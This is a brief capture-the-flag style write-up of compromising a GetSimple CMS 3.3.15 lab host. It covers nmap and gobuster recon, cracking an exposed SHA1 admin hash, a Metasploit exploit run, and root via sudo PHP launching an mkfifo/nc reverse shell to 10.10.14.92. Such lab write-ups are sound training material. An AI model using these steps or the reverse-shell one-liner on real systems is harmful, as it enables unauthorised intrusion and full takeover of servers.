# Writeup - Get Simple CMS

## Initial analysis

```shell
$ nmap -sV -Pn 10.129.42.249

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

```

### System
* OS
    * Name: Ubuntu
    * Version: 
* Apache
    * Version: 2.4.41

### GetSimple - CMS

```shell
$ gobuster dir -u http://10.129.42.249 -w /usr/share/dirb/wordlists/common.txt

/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.129.42.249/admin/]
/.hta                 (Status: 403) [Size: 278]                                  
/.htaccess            (Status: 403) [Size: 278]                                  
/backups              (Status: 301) [Size: 316] [--> http://10.129.42.249/backups/]
/data                 (Status: 301) [Size: 313] [--> http://10.129.42.249/data/]   
/index.php            (Status: 200) [Size: 5485]                                   
/plugins              (Status: 301) [Size: 316] [--> http://10.129.42.249/plugins/]
/robots.txt           (Status: 200) [Size: 32]                                     
/server-status        (Status: 403) [Size: 278]                                    
/sitemap.xml          (Status: 200) [Size: 431]                                    
/theme                (Status: 301) [Size: 314] [--> http://10.129.42.249/theme/]  
```

#### Found resources
* http://10.129.42.249/admin/
* http://10.129.42.249/data/users/admin.xml
* https://10015.io/tools/sha1-encrypt-decrypt

### Info
* Version: 3.3.15
* User: admin
* Password: d033e22ae348aeb5660fc2140aec35850c4da997 => (SHA1) => admin

### Access - mrb3n

```shell
msfconsole
search getsimple
use 1
set rhost xxx
set lhost xxx
exploit
```

### Access - root

```shell
sudo -l

sudo /usr/bin/php -a
system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.92 1234 >/tmp/f");
```
